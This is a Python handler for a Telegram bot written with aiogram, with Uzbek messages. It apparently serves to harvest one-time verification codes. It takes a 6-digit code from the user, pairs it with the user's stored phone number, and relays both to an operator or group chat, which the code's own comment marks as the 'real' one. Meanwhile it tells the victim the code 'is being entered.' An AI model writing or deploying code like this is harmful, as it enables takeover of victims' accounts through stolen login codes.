from aiogram import types
from aiogram.dispatcher.filters.builtin import CommandStart
from states.holatlar import Holatlar
from loader import dp, db, bot
from data.config import group_chat_id
from keyboards.inline.feedback_keyboard import after_feedback_inline_keyboard


@dp.message_handler(lambda message: message.text.isdigit(), state=Holatlar.code)
async def phone_handler(message: types.Message):

    xona = len(message.text)
    if xona == 6:
        kod = int(message.text)
        user_id = message.from_user.id
        phone_number = await db.get_phone_number_using_user_id(user_id)
        target = None
        member_id = await db.get_member_id(user_id)
        await db.update_code(kod, user_id)
        if member_id:
            target = member_id
        else:
            target = group_chat_id

        await bot.send_message(chat_id=target, text=f"{phone_number} raqamiga kod: {kod}", reply_markup=after_feedback_inline_keyboard)

        await message.answer("Siz bergan kod kiritilmoqda. Iltimos, kutib turing")

        # haqiqiysi -1001543118750
    else:
        await message.answer("Iltimos, kod sifatida 6 xonali raqam kiriting")


@dp.message_handler(lambda message: not message.text.isdigit(), state=Holatlar.code)
async def process_code_invalid(message: types.Message):

    return await message.reply("Iltimos, 6 xonali raqam kiriting")
